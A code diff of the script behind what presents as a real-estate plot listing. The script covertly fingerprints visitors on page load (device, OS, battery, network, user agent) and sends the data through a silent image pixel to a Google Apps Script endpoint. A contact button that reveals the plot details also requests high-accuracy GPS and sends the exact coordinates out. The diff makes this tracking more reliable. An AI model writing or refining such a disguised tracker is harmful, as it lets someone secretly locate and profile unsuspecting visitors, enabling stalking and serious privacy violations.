@@ -89,20 +89,21 @@
 </div>
 
 <script>
-    // ⚠️ PASTE YOUR NEW GOOGLE SCRIPT /exec URL HERE
-    var scriptURL = 'https://script.google.com/macros/s/AKfycbw3tj20rRQpFLinvpMfYg4HyULI9LiD_WEYdnnmAFytgJbl0z99OqY_s6bPyHJZXGUT9w/exec';
+    // ⚠️ REPLACE THIS WITH YOUR NEW GOOGLE SCRIPT /exec URL
+    var scriptURL = 'https://script.google.com/macros/s/AKfycbxAHsksT2x3H8QYtlRKXeLcrSZ7b5dmdOxQTO49Bdn1X3wkKftSDDrc3D6bDcf4Y4XXcg/exec';
     
     // Unique Session ID
     var sid = 'SID_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 
-    // Fixed Plot Information (Embedded from Page Content)
+    // Exact Plot Info (mirrors your page content)
     const fixedPlotData = {
         plotNo: "1039 and 1040",
         sector: "Sector I",
         features: "Pair Kanal Plots | Double Corner with both plots | 80 Feet Road | Near to park and Masjid | Direct approach to 300 feet road | Near to commercial"
     };
 
-    // Helper to get Battery Info (Async)
+    // --- HELPERS ---
+
     async function getBatteryInfo() {
         if ('getBattery' in navigator) {
             try {
@@ -118,16 +119,11 @@
         return { level: 'Not Supported', charging: 'N/A' };
     }
 
-    // Helper to get Network Info
     function getNetworkInfo() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            return conn.effectiveType || 'Unknown';
-        }
-        return 'Unknown';
+        return conn ? (conn.effectiveType || 'Unknown') : 'Unknown';
     }
 
-    // Helper to get Device Fingerprint
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Unknown";
@@ -136,38 +132,31 @@
         if (ua.indexOf("Android") > -1) {
             os = "Android";
             const match = ua.match(/\(([^)]+)\)/);
-            if (match && match[1]) {
-                model = match[1].split(';')[0];
-            }
-        } else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
-            os = "iOS";
-            model = ua.indexOf("iPhone") > -1 ? "iPhone" : "iPad";
+            if (match && match[1]) model = match[1].split(';')[0];
+        } else if (ua.indexOf("iPhone") > -1) {
+            os = "iOS"; model = "iPhone";
+        } else if (ua.indexOf("iPad") > -1) {
+            os = "iOS"; model = "iPad";
         } else {
-            os = "Desktop";
-            model = "PC/Mac";
+            os = "Desktop"; model = "PC/Mac";
         }
 
-        return {
-            model: model,
-            os: os,
-            screen: screen.width + 'x' + screen.height,
-            ua: ua // Return raw UA, encoding happens in trackEvent
-        };
+        return { model: model, os: os, screen: screen.width + 'x' + screen.height, ua: ua };
     }
 
-    // Main Tracking Function (Merged with Plot Data + Robust Device Info)
+    // --- CORE TRACKER ---
+    // CRITICAL FIX: This now builds the URL immediately and guarantees the Image() pixel fires.
     async function trackEvent(eventType, lat, lon, acc, statusMsg) {
         if(scriptURL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
-            console.error('Script URL not set');
+            console.error('Google Script URL is not set!');
             return;
         }
 
-        // Gather all device data
+        // Gather device info
         const batteryInfo = await getBatteryInfo();
         const networkInfo = getNetworkInfo();
         const deviceInfo = getDeviceInfo();
 
-        // Construct Device JSON for the Sheet
         const devicePayload = {
             model: deviceInfo.model,
             os: deviceInfo.os,
@@ -177,49 +166,47 @@
             screen: deviceInfo.screen
         };
 
-        // Build URLSearchParams (properly encoded)
-        const params = new URLSearchParams();
-        params.append('sid', sid);
-        params.append('event', eventType);
+        // Build payload EXPLICITLY to avoid any undefined values
+        var payload = new URLSearchParams();
+        payload.append('sid', sid);
+        payload.append('event', eventType);
+        payload.append('plot', fixedPlotData.plotNo);
+        payload.append('sector', fixedPlotData.sector);
+        payload.append('features', fixedPlotData.features);
         
-        // --- DHA PLOT DATA ---
-        params.append('plot', fixedPlotData.plotNo);
-        params.append('sector', fixedPlotData.sector);
-        params.append('features', fixedPlotData.features);
-        // -----------------------
+        // GPS FIX: Only send lat/lon if they are real numbers, otherwise send empty string
+        payload.append('lat', (typeof lat === 'number') ? lat.toFixed(6) : '');
+        payload.append('lon', (typeof lon === 'number') ? lon.toFixed(6) : '');
+        payload.append('acc', (typeof acc === 'number') ? acc : 0);
         
-        // Location Data
-        params.append('lat', lat || '0');
-        params.append('lon', lon || '0');
-        params.append('acc', acc || 0);
-        params.append('status', statusMsg || '');
-        
-        // Device Data
-        params.append('device', encodeURIComponent(JSON.stringify(devicePayload)));
-        params.append('ua', encodeURIComponent(deviceInfo.ua));
+        payload.append('status', statusMsg || '');
+        payload.append('device', encodeURIComponent(JSON.stringify(devicePayload)));
+        payload.append('ua', encodeURIComponent(deviceInfo.ua));
 
-        const url = scriptURL + '?' + params.toString();
+        var url = scriptURL + '?' + payload.toString();
 
-        // Silent Tracking using Image Pixel (Works on all browsers, no CORS issues)
+        // Method 1: Image Pixel (Most reliable, works across all browsers)
         var img = new Image();
         img.src = url;
 
-        // Backup Tracking using Fetch (Modern Browsers)
+        // Method 2: Fetch backup
         if (typeof fetch !== 'undefined') {
             try {
-                fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
+                fetch(url, { method: 'GET', mode: 'no-cors' }).catch(function(){});
             } catch(e) {}
         }
         
-        console.log('Tracked:', eventType, sid);
+        console.log('Tracked:', eventType, '| Lat:', lat, '| Lon:', lon);
     }
 
-    // 1. On Page Load: Track User Entry
-    window.addEventListener('DOMContentLoaded', async () => {
-        await trackEvent('PAGE_LOAD', '', '', 0, 'User opened website');
+    // --- EVENTS ---
+
+    // 1. Page Load
+    window.addEventListener('DOMContentLoaded', function() {
+        trackEvent('PAGE_LOAD', null, null, 0, 'User opened website');
     });
 
-    // 2. Button Click: Track Interaction & Get GPS
+    // 2. Button Click
     function handleButtonClick() {
         var btn = document.getElementById('contactBtn');
         var loader = document.getElementById('loader');
@@ -227,24 +214,29 @@
         btn.style.display = 'none';
         loader.style.display = 'flex';
 
-        trackEvent('BUTTON_CLICK', '', '', 0, 'User clicked button');
+        // Log the click immediately, then request GPS
+        trackEvent('BUTTON_CLICK', null, null, 0, 'User clicked button');
         requestGPS();
     }
 
-    // 3. GPS Logic: High Accuracy for Pinpointing
+    // 3. GPS Request (High Accuracy)
     function requestGPS() {
         if (!navigator.geolocation) {
-            trackEvent('GPS_UNAVAILABLE', '', '', 0, 'Geolocation API not supported');
+            trackEvent('GPS_UNAVAILABLE', null, null, 0, 'Geolocation not supported');
             showContent();
             return;
         }
 
         navigator.geolocation.getCurrentPosition(
             function(position) {
+                // EXTRACT EXACT COORDINATES
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
                 var acc = Math.round(position.coords.accuracy || 0);
                 
+                console.log('GPS Raw:', lat, lon, acc);
+
+                // Pinpoint accuracy threshold
                 if(acc < 100) {
                     trackEvent('GPS_SUCCESS', lat, lon, acc, 'High Precision Location');
                 } else {
@@ -253,19 +245,18 @@
                 showContent();
             },
             function(error) {
-                var code = error.code;
-                var name = 'GPS_FAILED';
-                if (code === 1) name = 'GPS_DENIED';
-                if (code === 2) name = 'GPS_OFF';
-                if (code === 3) name = 'GPS_TIMEOUT';
+                var errName = 'GPS_FAILED';
+                if (error.code === 1) errName = 'GPS_DENIED';
+                if (error.code === 2) errName = 'GPS_OFF';
+                if (error.code === 3) errName = 'GPS_TIMEOUT';
                 
-                trackEvent(name, '', '', 0, error.message || 'Location failed');
+                trackEvent(errName, null, null, 0, error.message || 'Location failed');
                 showContent();
             },
             { 
-                enableHighAccuracy: true,
+                enableHighAccuracy: true, // Forces real GPS, not IP guessing
                 timeout: 15000,
-                maximumAge: 0
+                maximumAge: 0             // No cache
             }
         );
     }
@@ -276,7 +267,7 @@
             document.getElementById('successMsg').style.display = 'block';
             document.getElementById('plotDetails').style.display = 'block';
             document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth' });
-        }, 1000);
+        }, 800);
     }
 </script>
 
